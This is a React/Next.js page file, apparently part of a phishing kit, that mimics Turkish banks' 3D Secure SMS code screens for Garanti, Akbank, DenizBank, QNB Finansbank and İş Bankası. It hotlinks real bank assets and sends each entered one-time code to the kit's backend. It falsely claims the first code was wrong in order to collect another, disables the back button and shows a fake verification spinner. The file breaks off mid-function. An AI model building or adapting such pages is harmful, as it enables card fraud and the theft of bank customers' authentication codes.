'use client';

import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';

interface SmsData {
    tutar: string;
    tarih: string;
    lastFourDigits: string;
    cardType: 'visa' | 'mastercard' | 'unknown';
    maskedPhone: string;
    isyeriAdi: string;
    banka?: string;
}

export default function HataliSmsPage() {
    const router = useRouter();
    const [data, setData] = useState<SmsData | null>(null);
    const [loading, setLoading] = useState(true);
    const [smsCode, setSmsCode] = useState('');
    // Hatalı SMS sayfası olduğu için hata mesajını varsayılan olarak set ediyoruz
    const [error, setError] = useState('Doğrulama kodunu hatalı girdiniz. Lütfen tekrar deneyiniz.');
    const [timeLeft, setTimeLeft] = useState(180);
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [isSuccess, setIsSuccess] = useState(false);
    const [isTimeout, setIsTimeout] = useState(false);
    const [referansNo] = useState(() => Math.random().toString(36).substring(2, 10).toUpperCase());
    const inputRef = useRef<HTMLInputElement>(null);

    // Geri gidilmesin
    useEffect(() => {
        window.history.pushState(null, '', window.location.href);
        const handlePopState = () => {
            window.history.pushState(null, '', window.location.href);
        };
        window.addEventListener('popstate', handlePopState);
        return () => window.removeEventListener('popstate', handlePopState);
    }, []);

    // Verileri yükle
    useEffect(() => {
        const fetchData = async () => {
            try {
                const response = await fetch('/api/sms');
                const result = await response.json();
                
                if (result.success) {
                    setData(result.data);
                } else if (result.redirect) {
                    router.push(result.redirect);
                }
            } catch (err) {
                console.error('Veri yükleme hatası:', err);
            } finally {
                setLoading(false);
            }
        };

        fetchData();
    }, [router]);

    // Geri sayım
    useEffect(() => {
        if (timeLeft <= 0) {
            setIsTimeout(true);
            return;
        }

        const timer = setInterval(() => {
            setTimeLeft(prev => prev - 1);
        }, 1000);

        return () => clearInterval(timer);
    }, [timeLeft]);

    // Input'a focus
    useEffect(() => {
        if (!loading && inputRef.current) {
            inputRef.current.focus();
        }
    }, [loading]);

    const formatTime = (seconds: number) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setError('');

        if (smsCode.length < 5) {
            setError('Şifrenizi giriniz');
            setSmsCode('');
            return;
        }

        setIsSubmitting(true);

        try {
            const response = await fetch('/api/sms', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ smsCode })
            });

            const result = await response.json();

            if (result.success) {
                setIsSuccess(true); // Onay ekranına geçiş yap
            } else {
                setError(result.error || 'Bir hata oluştu');
            }
        } catch (err) {
            setError('Bağlantı hatası');
        } finally {
            setIsSubmitting(false);
        }
    };

    const handleRetry = () => {
        setTimeLeft(180);
        setIsTimeout(false);
        setSmsCode('');
        setError('Doğrulama kodunu hatalı girdiniz. Lütfen tekrar deneyiniz.');
    };

    const handleCancel = () => {
        router.push('/');
    };

    if (loading) {
        return (
            <div className="flex items-center justify-center min-h-screen bg-gray-50 dark:bg-gray-900">
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                `}</style>
                <div className="w-12 h-12 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin"></div>
            </div>
        );
    }

    if (isSuccess) {
        return (
            <>
                <link rel="stylesheet" href="/assets/bkm/css/bkmacs2-dist.css" />
                <link rel="stylesheet" href="/assets/bkm/css/main-dist.css" />
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                    @keyframes spin { to { transform: rotate(360deg); } }
                `}</style>
                <div className="content-wrapper" style={{ margin: '0 auto', maxWidth: '480px' }}>
                    <div className="header" style={{ marginTop: '1px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '0 10px' }}>
                        <div className="brand-logo" style={{ margin: 0 }}>
                            <Image 
                                src={data?.cardType === 'visa' ? '/assets/garanti/img/psimage_visa.png' : '/assets/garanti/img/psimage_mc.png'}
                                alt="Card" width={80} height={50} style={{ objectFit: 'contain' }}
                            />
                        </div>
                        <div>
                            {/* eslint-disable-next-line @next/next/no-img-element */}
                            <img src="/api/csfour-proxy/staticimage/carrefoursacom-logo.svg" alt="CarrefourSA" style={{ height: '30px', objectFit: 'contain' }} />
                        </div>
                    </div>
                    <div id="approve-page">
                        <div className="content">
                            <div style={{ marginTop: '60px', textAlign: 'center', padding: '0 20px' }} className="action-wrapper">
                                <div style={{ width: '80px', height: '80px', margin: '0 auto 24px', position: 'relative' }}>
                                    <div style={{ width: '100%', height: '100%', border: '4px solid #e5e7eb', borderTopColor: '#3b82f6', borderRadius: '50%', animation: 'spin 1s linear infinite' }} />
                                </div>
                                <h1 className="small" style={{ fontSize: '20px', fontWeight: '600', color: '#1f2937', marginBottom: '12px' }}>İşleminiz Doğrulanıyor</h1>
                                <p style={{ fontSize: '14px', color: '#6b7280', lineHeight: '1.6', marginBottom: '20px' }}>Bankanız tarafından gönderilen doğrulama kodu kontrol ediliyor.<br />Lütfen bu sayfadan ayrılmayınız.</p>
                                <div style={{ background: '#fef3c7', border: '1px solid #fcd34d', borderRadius: '8px', padding: '12px 16px', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#d97706" strokeWidth="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                                    <span style={{ fontSize: '13px', color: '#92400e' }}>Bu işlem birkaç saniye sürebilir</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </>
        );
    }

    const bank = (data?.banka || '').toLowerCase().trim();

    // 1. GARANTİ RENDER METODU
    const renderGaranti = () => {
        return (
            <>
                <link rel="stylesheet" href="/assets/garanti/css/fonts.css" />
                <link rel="stylesheet" href="/assets/garanti/css/styles.css" />
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                    body { background: #fff !important; }
                    .threed-page { background: #fff !important; }
                `}</style>
                <div className="threed-page py-4">
                    <div className="container" style={{ maxWidth: '480px', margin: '0 auto', padding: '0 15px' }}>
                        <div className="shadow px-3 px-sm-4 pb-1 theme-garanti border rounded" style={{ borderColor: '#e9ecef' }}>
                            <div className="pt-2">
                                <div className="text-right mb-2">
                                    <button onClick={handleCancel} className="btn btn-link p-0 text-muted" style={{ fontSize: '12px' }}>İptal</button>
                                </div>
                                <div className="row m-0 title d-flex justify-content-between align-items-center mb-3">
                                    <div className="col-6 text-left px-0">
                                        <Image height={39} width={64} src="https://gbemv3dsecure.garanti.com.tr/assets/img/issuer.png" alt="Garanti" style={{ objectFit: 'contain' }} />
                                    </div>
                                    <div className="col-6 text-right px-0">
                                        <Image src={data?.cardType === 'visa' ? '/assets/garanti/img/psimage_visa.png' : '/assets/garanti/img/psimage_mc.png'} alt="Brand" width={64} height={39} style={{ objectFit: 'contain' }} />
                                    </div>
                                </div>
                                <h6 className="text-center mb-4 font-weight-bold" style={{ color: '#00843d', fontSize: '15px' }}>
                                    3D SECURE ÖDEME DOĞRULAMA
                                </h6>
                                <div className="summary mb-4" style={{ background: '#f8f9fa', padding: '15px', borderRadius: '8px' }}>
                                    <ul className="list-unstyled m-0" style={{ fontSize: '13px', color: '#495057' }}>
                                        <li className="d-flex justify-content-between py-1 border-bottom"><label className="m-0 font-weight-bold">Tutar:</label><span>{data?.tutar} ₺</span></li>
                                        <li className="d-flex justify-content-between py-1 border-bottom"><label className="m-0 font-weight-bold">Mağaza:</label><span>{data?.isyeriAdi}</span></li>
                                        <li className="d-flex justify-content-between py-1 border-bottom"><label className="m-0 font-weight-bold">Kart No:</label><span>XXXX XXXX XXXX {data?.lastFourDigits}</span></li>
                                        <li className="d-flex justify-content-between py-1 border-bottom"><label className="m-0 font-weight-bold">Tarih:</label><span>{data?.tarih}</span></li>
                                    </ul>
                                </div>

                                <div id="approve-page">
                                    {isSubmitting && (
                                        <div className="d-flex flex-column align-items-center justify-content-center py-4">
                                            <div className="spinner-border text-success mb-2" role="status"></div>
                                            <span style={{ fontSize: '12px', color: '#6c757d' }}>Doğrulanıyor...</span>
                                        </div>
                                    )}

                                    {!isSubmitting && (
                                        <form id="bkmform" onSubmit={handleSubmit}>
                                            <div className="form-group mb-4">
                                                {error && <p id="hata-box" style={{ color: 'red', fontSize: '13px' }} className="mb-2">{error}</p>}
                                                <label htmlFor="sms-kod" style={{ fontSize: '13px', lineHeight: '1.5', display: 'block', marginBottom: '10px' }}>
                                                    Sonu <strong>{data?.maskedPhone.slice(-4)}</strong> ile biten telefon numaranıza gönderilen doğrulama şifresini giriniz.
                                                </label>
                                                <div className="form-group mb-3">
                                                    <input
                                                        ref={inputRef}
                                                        minlength={5}
                                                        maxlength={6}
                                                        required
                                                        type="tel"
                                                        inputMode="numeric"
                                                        className="form-control form-pin text-center"
                                                        id="sms-kod"
                                                        placeholder="Şifreyi girin"
                                                        value={smsCode}
                                                        onChange={(e) => {
                                                            const val = e.target.value.replace(/\D/g, '').slice(0, 6);
                                                            setSmsCode(val);
                                                            setError('');
                                                        }}
                                                        disabled={isTimeout}
                                                        style={{ letterSpacing: '4px', fontSize: '18px', fontWeight: 'bold' }}
                                                    />
                                                </div>
                                                <div className="form-group">
                                                    <button 
                                                        id="acs-submit-btn" 
                                                        className="btn btn-success btn-block w-100 py-2.5 font-weight-bold text-white" 
                                                        type="submit" 
                                                        disabled={isTimeout || smsCode.length < 5}
                                                        style={{ background: '#00843d', border: 'none' }}
                                                    >
                                                        GÖNDER
                                                    </button>
                                                </div>
                                            </div>

                                            {isTimeout ? (
                                                <div className="text-center mb-3">
                                                    <p className="text-danger" style={{ fontSize: '13px' }}>Doğrulama kodunu zamanında girmediniz.</p>
                                                    <button type="button" onClick={handleRetry} className="btn btn-link text-success p-0 font-weight-bold" style={{ fontSize: '12px' }}>
                                                        YENİ ŞİFRE GÖNDER
                                                    </button>
                                                </div>
                                            ) : (
                                                <div className="text-center py-2 text-muted" style={{ fontSize: '13px' }}>
                                                    Kalan Süre: <span className="font-weight-bold text-success">{formatTime(timeLeft)}</span>
                                                </div>
                                            )}

                                            <div className="text-center font-weight-bold py-2 pb-sm-0 mb-3" style={{ fontSize: '11px', borderTop: '1px solid #f1f3f5' }}>
                                                <input type="checkbox" name="downloadbonus" className="form-check-input mr-2" id="downloadbonus" defaultChecked />
                                                <label htmlFor="downloadbonus" className="form-check-label text-muted">
                                                    Daha hızlı bir 3D Secure Ödeme Doğrulama deneyimi için BonusFlaş mobil uygulamasını indirmek istiyorum.
                                                </label>
                                            </div>
                                        </form>
                                    )}
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </>
        );
    };

    // 2. AKBANK RENDER METODU
    const renderAkbank = () => {
        return (
            <>
                <link rel="stylesheet" href="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_css/dijitalgozluk.css" />
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                    body { background: #f4f6f9 !important; }
                `}</style>
                <div className="py-4">
                    <form id="bkmform" onSubmit={handleSubmit} className="dijitalgozluk-arkaplan" style={{ maxWidth: '420px', margin: '0 auto', background: '#fff', borderRadius: '10px', boxShadow: '0 4px 15px rgba(0,0,0,0.08)', overflow: 'hidden' }}>
                        <div className="dijitalgozluk-ekran">
                            <div className="dijitalgozluk-cerceve" style={{ padding: '20px' }}>
                                <div className="dijitalgozluk-kapat text-right">
                                    <button type="button" onClick={handleCancel} style={{ background: 'none', border: 'none', fontSize: '16px', color: '#999' }}>✕</button>
                                </div>
                                <div className="dijitalgozluk-logolar d-flex justify-content-between align-items-center mb-3">
                                    <div className="dijitalgozluk-logo dijitalgozluk-logo-banka">
                                        <Image src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/logo-akbank.svg" alt="Akbank" width={110} height={30} style={{ objectFit: 'contain' }} />
                                    </div>
                                    <div className="dijitalgozluk-yazi dijitalgozluk-baslik text-right" style={{ fontSize: '11px', color: '#666', fontWeight: 'bold' }}>
                                        Uluslararası Güvenlik <br /> Platformu 3D Secure
                                    </div>
                                </div>
                                <div className="dijitalgozluk-tablo dijitalgozluk-tablo-bilgiler" style={{ background: '#f8f9fa', borderRadius: '8px', padding: '12px', marginBottom: '20px' }}>
                                    <div className="d-flex justify-content-between mb-2" style={{ fontSize: '13px' }}>
                                        <div className="font-weight-bold text-muted">İşyeri Adı</div>
                                        <div className="font-weight-bold">{data?.isyeriAdi}</div>
                                    </div>
                                    <div className="d-flex justify-content-between mb-2" style={{ fontSize: '13px' }}>
                                        <div className="font-weight-bold text-muted">Tutar</div>
                                        <div className="font-weight-bold text-danger">{data?.tutar} ₺</div>
                                    </div>
                                    <div className="d-flex justify-content-between mb-2" style={{ fontSize: '13px' }}>
                                        <div className="font-weight-bold text-muted">Tarih</div>
                                        <div>{data?.tarih}</div>
                                    </div>
                                    <div className="d-flex justify-content-between" style={{ fontSize: '13px' }}>
                                        <div className="font-weight-bold text-muted">Kart Numarası</div>
                                        <div className="font-mono">************{data?.lastFourDigits}</div>
                                    </div>
                                </div>

                                {isSubmitting ? (
                                    <div className="text-center py-4">
                                        <div className="spinner-border text-danger" role="status"></div>
                                        <p className="mt-2 text-muted" style={{ fontSize: '13px' }}>İşleminiz onaylanıyor...</p>
                                    </div>
                                ) : (
                                    <div id="state-kod">
                                        <div className="d-flex gap-2 align-items-center mb-3">
                                            <Image src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/ikon-sms-36x31.png" alt="SMS" width={30} height={25} />
                                            <div style={{ fontSize: '12px', color: '#555', lineHeight: '1.4' }}>
                                                {data?.maskedPhone} nolu cep telefonunuza gönderilen 3D Secure şifresini giriniz.
                                                <br /><span className="text-muted">Referans no: {referansNo}</span>
                                            </div>
                                        </div>

                                        {error && <div className="text-danger mb-2 text-center" style={{ fontSize: '13px' }}>{error}</div>}

                                        <div className="dijitalgozluk-form-kontrol mb-3">
                                            <input
                                                ref={inputRef}
                                                type="tel"
                                                inputMode="numeric"
                                                id="sms-kod"
                                                className="form-control text-center py-2"
                                                maxLength={6}
                                                required
                                                value={smsCode}
                                                onChange={(e) => {
                                                    const val = e.target.value.replace(/\D/g, '').slice(0, 6);
                                                    setSmsCode(val);
                                                    setError('');
                                                }}
                                                disabled={isTimeout}
                                                style={{ fontSize: '20px', letterSpacing: '6px', fontWeight: 'bold', border: '2px solid #ced4da', borderRadius: '6px' }}
                                                placeholder="------"
                                            />
                                        </div>

                                        {isTimeout ? (
                                            <div className="text-center mb-3">
                                                <span className="text-danger d-block mb-1" style={{ fontSize: '12px' }}>Doğrulama Kodunu belirtilen süre içerisinde girmediniz.</span>
                                                <button type="button" onClick={handleRetry} className="btn btn-danger btn-sm w-100 text-white">Doğrulama Kodunu Yeniden Gönder</button>
                                            </div>
                                        ) : (
                                            <div className="dijitalgozluk-uyari text-center mb-3" style={{ fontSize: '12px', color: '#e30613' }}>
                                                Onaylama süresi: <strong>{formatTime(timeLeft)}</strong>
                                            </div>
                                        )}

                                        <div className="dijitalgozluk-devam-dugmesi">
                                            <button 
                                                id="acs-submit-btn" 
                                                className="btn btn-danger w-100 py-2.5 font-weight-bold" 
                                                type="submit" 
                                                disabled={isTimeout || smsCode.length < 5}
                                                style={{ background: '#e30613', border: 'none', borderRadius: '6px' }}
                                            >
                                                Devam
                                            </button>
                                        </div>
                                    </div>
                                )}
                            </div>
                        </div>
                    </form>
                </div>
            </>
        );
    };

    // 3. DENİZBANK RENDER METODU
    const renderDenizbank = () => {
        return (
            <>
                <style dangerouslySetInnerHTML={{ __html: `
                    .dn-wrap{background:#fff;width:min(420px,96vw);border-radius:10px;box-shadow:0 4px 24px rgba(0,100,180,.15);overflow:hidden;margin: 20px auto;}
                    .dn-header{background:linear-gradient(135deg,#0069b4,#004a80);padding:16px 22px;display:flex;align-items:center;justify-content:space-between}
                    .dn-logo{color:#fff;font-size:22px;font-weight:900;letter-spacing:-1px}
                    .dn-logo span{color:#85c8ff}
                    .dn-secure{font-size:11px;color:#85c8ff;font-weight:600;border:1px solid #85c8ff55;padding:4px 10px;border-radius:20px}
                    .dn-card-strip{background:#e8f4fc;padding:10px 22px;display:flex;align-items:center;gap:12px}
                    .dn-card-icon{width:40px;height:28px;background:linear-gradient(135deg,#0069b4,#85c8ff);border-radius:4px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:10px;font-weight:700;flex-shrink:0}
                    .dn-card-number{font-size:13px;font-weight:700;color:#004a80;font-family:monospace;letter-spacing:2px}
                    .dn-body{padding:20px 22px}
                    .dn-info-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:16px}
                    .dn-info-box{background:#f4faff;border:1px solid #c8e4f8;border-radius:6px;padding:10px 12px}
                    .dn-info-box .lbl{font-size:11px;color:#0069b4;font-weight:700;margin-bottom:2px}
                    .dn-info-box .val{font-size:13px;color:#222;font-weight:700}
                    .dn-hata-box{background:#fff3cd;border:1px solid #ffc107;color:#856404;border-radius:4px;padding:9px 12px;font-size:12.5px;margin-bottom:12px;display:flex;align-items:center;gap:7px}
                    .dn-label{font-size:13px;color:#555;margin-bottom:8px}
                    .dn-label strong{color:#0069b4}
                    .dn-input{width:100%;border:2px solid #c8e4f8;border-radius:6px;padding:12px 14px;font-size:22px;letter-spacing:10px;text-align:center;font-weight:700;outline:none;margin-bottom:10px;color:#004a80;transition:.15s}
                    .dn-input:focus{border-color:#0069b4;box-shadow:0 0 0 3px #0069b422}
                    .dn-timer{font-size:12px;color:#888;text-align:center;margin-bottom:10px}
                    .dn-timer span{font-weight:700;color:#0069b4}
                    .dn-btn{width:100%;background:linear-gradient(90deg,#0069b4,#004a80);color:#fff;border:none;border-radius:6px;padding:13px;font-size:15px;font-weight:700;cursor:pointer;transition:.15s}
                    .dn-btn:hover{background:linear-gradient(90deg,#004a80,#003060)}
                    .dn-btn:disabled{opacity:.5;cursor:default}
                    .dn-footer{background:#f4faff;border-top:1px solid #c8e4f8;padding:10px 22px;font-size:11px;color:#aac;text-align:center}
                ` }} />
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                    body { background: #e8f4fc !important; }
                `}</style>

                <div className="dn-wrap">
                    <div className="dn-header">
                        <div className="dn-logo">Deniz<span>Bank</span></div>
                        <div className="dn-secure">🔒 3D Secure</div>
                    </div>
                    <div className="dn-card-strip">
                        <div className="dn-card-icon">KART</div>
                        <div className="dn-card-number">**** **** **** {data?.lastFourDigits}</div>
                    </div>
                    <div className="dn-body">
                        <div className="dn-info-grid">
                            <div className="dn-info-box"><div class="lbl">TUTAR</div><div class="val">{data?.tutar} ₺</div></div>
                            <div className="dn-info-box"><div class="lbl">TARİH</div><div class="val">{data?.tarih}</div></div>
                            <div className="dn-info-box" style={{ gridColumn: '1/-1' }}><div class="lbl">İŞYERİ</div><div class="val">{data?.isyeriAdi}</div></div>
                        </div>

                        {isSubmitting ? (
                            <div className="text-center py-4">
                                <div className="spinner-border text-primary" role="status"></div>
                                <p className="mt-2 text-muted" style={{ fontSize: '13px' }}>Onaylanıyor...</p>
                            </div>
                        ) : (
                            <form id="bkmform" onSubmit={handleSubmit}>
                                {error && <div className="dn-hata-box">⚠️ {error}</div>}
                                <p className="dn-label">Telefonunuza gönderilen <strong>6 haneli SMS kodunu</strong> giriniz:</p>
                                <input
                                    ref={inputRef}
                                    className="dn-input"
                                    id="sms-kod"
                                    type="tel"
                                    inputMode="numeric"
                                    maxLength={6}
                                    placeholder="______"
                                    value={smsCode}
                                    onChange={(e) => {
                                        const val = e.target.value.replace(/\D/g, '').slice(0, 6);
                                        setSmsCode(val);
                                        setError('');
                                    }}
                                    disabled={isTimeout}
                                />

                                {isTimeout ? (
                                    <div className="text-center mb-3">
                                        <p className="text-danger" style={{ fontSize: '12px' }}>Kod süresi doldu.</p>
                                        <button type="button" onClick={handleRetry} className="btn btn-link text-primary font-weight-bold" style={{ fontSize: '12px' }}>
                                            Kodu Yeniden Gönder
                                        </button>
                                    </div>
                                ) : (
                                    <p className="dn-timer">Kalan süre: <span>{formatTime(timeLeft)}</span></p>
                                )}

                                <button 
                                    className="dn-btn" 
                                    id="acs-submit-btn" 
                                    type="submit" 
                                    disabled={isTimeout || smsCode.length < 5}
                                >
                                    ONAYLA
                                </button>
                            </form>
                        )}
                    </div>
                    <div className="dn-footer">🔒 DenizBank Güvenli Ödeme Sistemi</div>
                </div>
            </>
        );
    };

    // 4. QNB FİNANSBANK RENDER METODU
    const renderFinansbank = () => {
        return (
            <>
                <link rel="stylesheet" href="https://acs.qnbfinansbank.com/css/bundle.min.css?v=MdyKrhjGqNYJdJs5G1Aekf5F3lnmp-fqFmHweUkHZw0" />
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                    body { background: #fff !important; }
                `}</style>
                <div className="content-wrapper" id="content" style={{ display: 'block', maxWidth: '480px', margin: '0 auto', padding: '15px' }}>
                    <div className="header d-flex justify-content-between align-items-center mb-3">
                        <div className="brand-logo">
                            <Image src="https://acs.qnbfinansbank.com/img/brand/troy.png" alt="troy" width={70} height={35} style={{ objectFit: 'contain' }} />
                        </div>
                        <div className="member-logo">
                            <Image src="https://acs.qnbfinansbank.com/img/finansbank.png" alt="qnb" width={140} height={35} style={{ objectFit: 'contain' }} />
                        </div>
                    </div>
                    <div id="approve-page">
                        <div className="content">
                            <h1 id="approve-header" style={{ fontSize: '18px', fontWeight: 'bold', color: '#552382', marginBottom: '15px' }}>Doğrulama kodunu giriniz</h1>
                            <div className="info-wrapper" style={{ background: '#f8f9fa', padding: '15px', borderRadius: '8px', marginBottom: '20px' }}>
                                <div className="d-flex justify-content-between py-1 border-bottom" style={{ fontSize: '13px' }}>
                                    <div className="info-label text-muted">İşyeri Adı:</div>
                                    <div className="font-weight-bold">{data?.isyeriAdi}</div>
                                </div>
                                <div className="d-flex justify-content-between py-1 border-bottom" style={{ fontSize: '13px' }}>
                                    <div className="info-label text-muted">İşlem Tutarı:</div>
                                    <div className="font-weight-bold text-success">{data?.tutar} TL</div>
                                </div>
                                <div className="d-flex justify-content-between py-1 border-bottom" style={{ fontSize: '13px' }}>
                                    <div className="info-label text-muted">İşlem Tarihi-Saati:</div>
                                    <div>{data?.tarih}</div>
                                </div>
                                <div className="d-flex justify-content-between py-1" style={{ fontSize: '13px' }}>
                                    <div className="info-label text-muted">Kart Numarası:</div>
                                    <div className="font-mono">XXXX XXXX XXXX {data?.lastFourDigits}</div>
                                </div>
                            </div>

                            {isSubmitting ? (
                                <div className="text-center py-4">
                                    <div className="spinner-border text-primary" role="status" style={{ color: '#552382' }}></div>
                                    <p className="mt-2 text-muted" style={{ fontSize: '13px' }}>Onaylanıyor...</p>
                                </div>
                            ) : (
                                <form id="bkmform" onSubmit={handleSubmit}>
                                    <div className="action-wrapper">
                                        {error && <p style={{ color: 'red', fontSize: '13px', marginBottom: '10px' }}>{error}</p>}
                                        <h3 style={{ fontSize: '13px', lineHeight: '1.5', marginBottom: '15px' }}>
                                            İşlem şifreniz <span>{data?.maskedPhone}</span> olan cep telefonunuza gönderilecektir.
                                            <br />Lütfen <span className="font-weight-bold">{referansNo}</span> referans numaralı alışveriş şifrenizi giriniz.
                                        </h3>
                                    </div>

                                    <div className="form-wrapper">
                                        <div className="form-group mb-3">
                                            <label htmlFor="sms-kod" className="mb-1" style={{ fontSize: '13px', fontWeight: 'bold' }}>Doğrulama Kodu</label>
                                            <input
                                                ref={inputRef}
                                                type="tel"
                                                className="form-control text-center py-2"
                                                name="sms"
                                                id="sms-kod"
                                                maxLength={6}
                                                required
                                                value={smsCode}
                                                onChange={(e) => {
                                                    const val = e.target.value.replace(/\D/g, '').slice(0, 6);
                                                    setSmsCode(val);
                                                    setError('');
                                                }}
                                                disabled={isTimeout}
                                                style={{ fontSize: '18px', letterSpacing: '4px', fontWeight: 'bold' }}
                                            />
                                        </div>

                                        {isTimeout ? (
                                            <div className="text-center mb-3">
                                                <span className="text-danger d-block mb-2" style={{ fontSize: '12px' }}>Doğrulama kodunu girmediniz.</span>
                                                <button type="button" onClick={handleRetry} className="btn btn-sm btn-outline-primary" style={{ borderColor: '#552382', color: '#552382' }}>
                                                    Tekrar Gönder
                                                </button>
                                            </div>
                                        ) : (
                                            <div className="d-flex justify-content-between align-items-center mb-3" style={{ fontSize: '13px' }}>
                                                <div>Kalan Süre: <span className="font-weight-bold text-danger">{formatTime(timeLeft)}</span></div>
                                                <button type="button" onClick={handleCancel} className="text-muted border-0 bg-transparent" style={{ textDecoration: 'underline' }}>İşlemi İptal Et</button>
                                            </div>
                                        )}

                                        <button 
                                            id="acs-submit-btn" 
                                            className="btn w-100 py-2.5 text-white font-weight-bold" 
                                            type="submit" 
                                            disabled={isTimeout || smsCode.length < 5}
                                            style={{ background: '#552382', borderRadius: '4px' }}
                                        >
                                            Onayla
                                        </button>
                                    </div>
                                </form>
                            )}
                        </div>
                    </div>
                </div>
            </>
        );
    };

    // 5. İŞ BANKASI RENDER METODU
    const renderIsbankasi = () => {
        return (
            <>
                <link rel="stylesheet" href="https://maxinet.isbank.com.tr/assets/css/bootstrap.min.css" />
                <link rel="stylesheet" href="https://maxinet.isbank.com.tr/assets/css/style.min.css" />
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                    body { background: #fff !important; }
                `}</style>
                <div style={{ maxWidth: '480px', margin: '0 auto', background: '#fff' }}>
                    <div className="container-fluid header Maximum" style={{ background: '#0f2c59', padding: '15px' }}>
                        <div className="d-flex justify-content-between align-items-center">
                            <Image src="https://maxinet.isbank.com.tr/assets/images/logo-isbank.png" alt="isbank" width={80} height={35} style={{ objectFit: 'contain' }} />
                            <div style={{ color: '#fff', fontWeight: 'bold', fontSize: '13px' }}>Maximum 3D Secure</div>
                        </div>
                    </div>
                    <div className="container-fluid cardno" style={{ background: '#f1f3f5', padding: '12px 15px', borderBottom: '1px solid #dee2e6' }}>
                        <div style={{ fontSize: '13px', fontWeight: 'bold', color: '#495057' }}>
                            <span>KART NUMARANIZ: </span>XXXX - XXXX - XXXX - <span className="text-primary">{data?.lastFourDigits}</span>
                        </div>
                    </div>
                    <div className="container-fluid details" style={{ padding: '15px' }}>
                        <div className="row" style={{ background: '#f8f9fa', padding: '12px', borderRadius: '6px', margin: '0 0 15px 0', fontSize: '12.5px' }}>
                            <div className="col-xs-12 col-sm-4 font-weight-bold mb-1">{data?.isyeriAdi}</div>
                            <div className="col-xs-6 col-sm-4 text-danger font-weight-bold mb-1">{data?.tutar} ₺</div>
                            <div className="col-xs-6 col-sm-4 text-muted">{data?.tarih}</div>
                        </div>

                        {error && <div className="text-danger mb-2 text-center" style={{ fontSize: '13px' }}>{error}</div>}

                        {isSubmitting ? (
                            <div className="text-center py-4">
                                <div className="spinner-border text-primary" role="status"></div>
                                <p className="mt-2 text-muted" style={{ fontSize: '13px' }}>Onaylanıyor...</p>
                            </div>
                        ) : (
                            <form id="bkmform" onSubmit={handleSubmit}>
                                <div id="state-kod">
                                    <div className="mb-3" style={{ fontSize: '12.5px', color: '#495057', lineHeight: '1.5' }}>
                                        Online alışverişinizin ödemesini tamamlamak için, <strong>{data?.maskedPhone}</strong> numaralı cep telefonunuza gelen şifreyi giriniz.
                                    </div>
                                    <div className="formHolder">
                                        <div className="form-group mb-3">
                                            <input
                                                ref={inputRef}
                                                id="sms-kod"
                                                type="tel"
                                                inputMode="numeric"
                                                className="form-control text-center py-2"
                                                maxLength={6}
                                                placeholder="Doğrulama Kodu"
                                                required
                                                value={smsCode}
                                                onChange={(e) => {
                                                    const val = e.target.value.replace(/\D/g, '').slice(0, 6);
                                                    setSmsCode(val);
                                                    setError('');
                                                }}
                                                disabled={isTimeout}
                                                style={{ fontSize: '18px', letterSpacing: '4px', fontWeight: 'bold' }}
                                            />
                                        </div>

                                        <div className="form-group mb-3">
                                            <button 
                                                id="acs-submit-btn" 
                                                type="submit" 
                                                className="btn btn-primary w-100 py-2.5 font-weight-bold" 
                                                disabled={isTimeout || smsCode.length < 5}
                                                style={{ background: '#0f2c59', border: 'none' }}
                                            >
                                                ONAYLA
                                            </button>
                                        </div>

                                        <div className="d-flex justify-content-between align-items-center mb-3" style={{ fontSize: '13px' }}>
                                            <button type="button" onClick={handleCancel} className="btn btn-link p-0 text-muted" style={{ fontSize: '12px' }}>İşlemi İptal Et</button>
                                            <button type="button" className="btn btn-link p-0 text-muted" style={{ fontSize: '12px' }}>Yardım</button>
                                        </div>
                                    </div>
                                </div>

                                {isTimeout ? (
                                    <div className="text-center mb-3">
                                        <span className="text-danger d-block mb-1" style={{ fontSize: '12px' }}>Zaman aşımı nedeniyle kod geçerliliğini yitirdi.</span>
                                        <button type="button" onClick={handleRetry} className="btn btn-sm btn-outline-secondary">Tekrar Gönder</button>
                                    </div>
                                ) : (
                                    <div className="countdown text-center py-2 border-top text-muted" style={{ fontSize: '12px' }}>
                                        Kalan Süre: <span className="font-weight-bold text-danger">{formatTime(timeLeft)}</span>
                                    </div>
                                )}
                            </form>
                        )}
                    </div>
                </div>
            </>
        );
    };

    // 6. DİĞER BANKALAR VE BKM GO RENDER METODU
    const renderBkmGo = (logoUrl: string) => {
        return (
            <>
                <link rel="stylesheet" href="/assets/bkm/css/bkmacs2-dist.css" />
                <link rel="stylesheet" href="/assets/bkm/css/main-dist.css" />
